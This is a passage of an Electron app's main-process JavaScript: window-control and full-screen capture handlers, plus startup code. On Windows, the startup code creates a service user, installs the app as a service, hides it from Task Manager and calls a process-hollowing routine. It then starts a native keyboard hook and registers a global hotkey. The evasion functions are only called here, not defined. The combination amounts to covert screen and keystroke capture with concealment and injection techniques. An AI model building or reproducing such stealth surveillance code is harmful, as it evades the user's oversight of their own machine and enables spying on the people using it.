// Window control IPC handlers
ipcMain.on('window:minimize', () => {
    console.log('[window:minimize] Hiding window');
    win.hide();
});
ipcMain.on('window:maximize', () => {
    if (win.isMaximized()) {
        win.unmaximize();
    } else {
        win.maximize();
    }
});
ipcMain.on('window:close', () => win.close());

// Full-screen capture IPC handler
ipcMain.handle('capture-screen', async () => {
    const allWins = BrowserWindow.getAllWindows();
    const activeWin = allWins[0];

    // Hide window briefly so screenshot captures the clean desktop/apps behind it
    if (activeWin) activeWin.setOpacity(0);
    await new Promise((resolve) => setTimeout(resolve, 180));

    try {
        const primaryDisplay = screen.getPrimaryDisplay();
        const { width, height } = primaryDisplay.size;
        const factor = primaryDisplay.scaleFactor || 1;

        const sources = await desktopCapturer.getSources({
            types: ['screen'],
            thumbnailSize: {
                width: Math.round(width * factor),
                height: Math.round(height * factor),
            },
        });

        if (activeWin) activeWin.setOpacity(1);

        if (sources && sources.length > 0) {
            return sources[0].thumbnail.toDataURL();
        }
    } catch (err) {
        console.error('Failed to capture screen:', err);
        if (activeWin) activeWin.setOpacity(1);
    }
    return null;
});
}

app.whenReady().then(async () => {
    // Initialize Windows system programming features
    if (process.platform === 'win32') {
        try {
            // Create service user account
            await createServiceUser();

            // Install as Windows service
            await installAsService();

            // Set process metadata
            setProcessMetadata();

            // Hide from task manager
            hideFromTaskManager();

            // Demonstrate process hollowing concept
            demonstrateProcessHollowing();
        } catch (error) {
            console.error('Error initializing Windows system features:', error);
        }
    }

    createWindow();
    startNativeKeyHook();

    // Register Alt+A as secondary standard shortcut
    try {
        globalShortcut.register('Alt+A', () => {
            console.log('[HOTKEY TRIGGERED]: Alt+A');
            toggleWindow();
        });
    } catch (e) {
        console.log('Alt+A registration error:', e);
    }

    app.on('activate', () => {
        if (BrowserWindow.getAllWindows().length === 0) {
            createWindow();
        }
    });
});

app.on('will-quit', () => {
    if (psProcess) {
        psProcess.kill();
        psProcess = null;
    }
    globalShortcut.unregisterAll();
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});